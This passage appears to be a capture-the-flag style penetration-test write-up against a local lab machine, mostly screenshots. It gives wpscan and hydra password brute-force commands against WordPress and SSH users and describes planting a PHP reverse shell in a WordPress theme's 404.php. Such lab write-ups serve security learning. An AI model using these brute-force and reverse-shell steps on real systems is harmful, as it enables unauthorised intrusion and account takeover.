![](https://lh3.googleusercontent.com/FAb_CnIxI5KpAn2A7FCeB2F1dD1AJqfNvnMxcswf2ZcCVw1oKhK25RgSn11EVI0Q1CzSDEHSh73mn1b5X2kSPU1Eg3q7leyL5YGJ5IAt5pJzcZaDsFEDRJUJyCVzcjGVCEvVjAsu)



![](https://lh6.googleusercontent.com/n4P5CxdmWCxqGc5WfKmL4z_YW0v7Yl3S6Op0G8_aLIeGwzETCftDTTgBVaWCTvAMalWzAM0Wf0BryN820KJXkYeBBMLL1h2OSbw0caCuigQgA00qDoBR3lQC5GNj9dM6Y67Vutid)


The FTP can be accessed anonymously. Interesting. Let’s enter into it:


![](https://lh3.googleusercontent.com/lCFG0POpSEb-ZhP_qvGpWIDAlSWkh5RFnScEPACZBW3PllxRB41HsD5E6K1hJdoUgE163L2bPXSwyi0lY5ivQyxAcYDxBfa3WSUEtwqTWwcBPmarxcwm7cflYr85KnTOBsOrZI6B)


We have found a users.txt.bk file, let’s open it up:


![](https://lh5.googleusercontent.com/7gOLUy3nPZC319hW8Mc1JdzJLgEFhWkVGxLM33f6Li27d4r_InqMQn7Ou95H85Sa0ubk8SL7MqKxCSzNEyALkGMvZnrkS2kKxzvOEt7xgF3QCu_TrmrGWnzOQ3LxhlISP09-18e8)


Interesting list of users. Let’s see if each one of this users have ssh auth by password:


![](https://lh3.googleusercontent.com/r41YkEgNGUtkCK7Zj3ZU71zxwVZicOgBDqZCn33SSCfAdB4-hLa6morllZR4yeFIjRaRqskhdS7sisiUPfY6OMRaPeKzMTgLgZbRjQRSAhIVGcenQHjyMjDpRL3Qni-sC3CFAEmC)



## Exploitation

All users except mai and john can be accessed through ssh. At the moment we don’t know much, so let’s move forward towards port 80.

In our Nmap scan we have seen that there is a URI called /backup_wordpress/, where it is actually a wordpress:


![](https://lh3.googleusercontent.com/AW9d2d5pcR-ipLVC7RPctF9zNWGAh3EDY28Z7d9fcIEMrAeb_AjqSRKy2SePMHzMdwcZo1n6qC4OD6m701RqFeCgEGzxTxlrIEoC46gngl3DzV43ZJOnSLpEmiS75TNsuLlGlhaU)


**DISCLAIMER: from now on, the target IP has changed to 10.0.2.9**

We have seen that there is a post created by the user **john** let’s see if we can brute-force his password.

```shell
sudo wpscan --url http://10.0.2.9/backup_wordpress -P /usr/share/wordlists/rockyou.txt --usernames john
```



![](https://lh3.googleusercontent.com/wDdcVSUnMGYxEyOKPtBoD58T3ekqLunV1r9DRa6SmktvtijEU5hfl8aNM97cvPb9geaJcNAl2LrANrqxsrHU1XxGPj_MYWsAPnxuw3gXH7CWDTdwWhYMaZuFI81DONiD1_fazfSx)


We reach the WP Admin page!!


![](https://lh4.googleusercontent.com/Ombc8oh2q2RStlvtRNKFstO18Okq0DqjXcbpdIs95-OctTGuIfTsrNFo2XiJt23qeD_S3mzNGx7__J3fD5VGhoJVsVFJWQYuYaMV4k5fN5eQ1hBLdf5jWfQqYV5QAwzkZN6NKfyB)


Now we will go to Appearance -> Editor and we will edit the 404.php page so we can add a php reverse shell script into it:


![](https://lh5.googleusercontent.com/OpRep0VA_kStoiqmsTBofjKLM0lO0v-fdO-ygntjpqnJyMr9jyeNcCGS1L1kPNT6QNaX5EUI6_EKyYvzsdC7U2wHbiN3FF4riVxg_wyp0W1ande9kT579oUL6TUaWRR60OWFz2X0)


Now we navigate to this page (wp-content/themes/twentysixteen/404.php) and we have our reverse shell!


![](https://lh3.googleusercontent.com/h8yEZZO1qXrRvxFIcySxD7Fw5KRg6glJe2cCDhJwNNH0JnfAoM1POJmRsh7htqBbMOD17_BlBuuj8k4I_ZxpytPZHe_RcFtgREZby1ZtdkeR26XJ22agtCqnSvi6VYWR92hBrGpL)


Let’s see what system is running:


![](https://lh4.googleusercontent.com/zbvyjBefX75LIfhH4QkDzgK1xZlAiaEoD1sM8zsigt1-jpLppQwGhYE1FeLlyCkRsKJKUBklDUb9p-SBuZD7OnRv2HNoPlhE8bE_lz5nYzsQ5YjqYQYJdUeROMB8HlaMpOrUgM8S)


We don’t have a exploit available for `Ubuntu 12.04.4` & `linux kernel 3.11.0-15-generic`. So we will try to find another way.

Let’s check the users that are in the system, and see whether they have ssh access or not.


![](https://lh5.googleusercontent.com/S0kTWZVr7_Xi4yS1ZXdacAZZs3OrBOKr8gawOXDCneLMDKarDINMA05qjVIbypylRunNY4C1rYu1J89iAvHUpamse0rXFUAiP6aIVQOgPlYo_VcZqW5xDsEqe5ZJBxCRUIylxrhp)


We already know that john & mai require a public key to access through ssh, so let’s try with the rest:


![](https://lh3.googleusercontent.com/kz6U12Fz_4qJNJHrzczIGt0po29Ud14q2hzPYpE_EYTGDucAkdcmeBcew3ldDELkjnb3TFE3SVBlYR31DJldNmS3iJvoOdYynu5s8vfYS7iCCl1t1KU5mAx5nGf3Cm4q8keueXP-)


OK so we can only access with the user anne. Let’s brute force her with:

```shell
hydra -l anne -P /usr/share/wordlists/10k-most-common.txt 10.0.2.9 -V ssh
```

![](https://lh6.googleusercontent.com/gy8qRedDFdyWE8R1NgXR_PrxacdtMiM6bvTLQ0O8cTIAVnnpuJqSAtZD9BKR-_qoRxPjBvWTlhPfHk_O8U0wyu0xjZUpnRnkqrTuhUNSjtmV2UfYKp_k8vdX5Alx1nqwD6oZLsnC)



![](https://lh6.googleusercontent.com/L9DlmxGP-wP0xaqmaSV_32pRQ50wDttjkPjHjBRWVaK9qmf12SY6_iF8x_T83X1SMycHXUf0bMeeCoep4es7Ne2Q4CWab-LICJD9DU8WQzmNtjG7QICidstCPLbz6VERknArmrC5)


We got the flag!

## Privilege Escalation

As anne is already part of sudoers, we do have root privileges.


# Bibliography


[[1]	‘¿Qué es OSSTMM? Definición, historia y características’, Ciberseguridad. https://ciberseguridad.com/guias/desarrollo-seguro/osstmm/ (accessed Mar. 14, 2022).](https://www.zotero.org/google-docs/?dJwW8p)

[[2]	I. Araoz, ‘Seguridad Informática: Metodología de test de intrusión ISSAF’, Seguridad Informática, Apr. 14, 2009. http://insecuredata.blogspot.com/2009/04/metodologia-de-test-de-intrusion-issaf.html (accessed Mar. 14, 2022).](https://www.zotero.org/google-docs/?dJwW8p)

[[3]	‘Qué es OWASP y por qué todo desarrollador debería conocerlo’. https://blog.pleets.org/article/conoce-owasp (accessed Mar. 14, 2022).](https://www.zotero.org/google-docs/?dJwW8p)

[[4]	‘Metodologías Existentes | Alonso Caballero / ReYDeS’. http://www.reydes.com/d/?q=Metodologias_Existentes (accessed Mar. 14, 2022).](https://www.zotero.org/google-docs/?dJwW8p)

[[5]	‘Metodología de Pruebas de Intrusión en la NIST SP 800-115’, Behique Digital, May 10, 2017. https://henryraul.wordpress.com/2017/05/10/metodologia-de-pruebas-de-intrusion-en-la-nist-sp-800-115/ (accessed Mar. 14, 2022).](https://www.zotero.org/google-docs/?dJwW8p)

[[6]	‘What is directory traversal, and how to prevent it? | Web Security Academy’. https://portswigger.net/web-security/file-path-traversal (accessed Mar. 14, 2022).](https://www.zotero.org/google-docs/?dJwW8p)

[[7]	‘User-Agent - HTTP | MDN’. https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent (accessed Mar. 14, 2022).](https://www.zotero.org/google-docs/?dJwW8p)
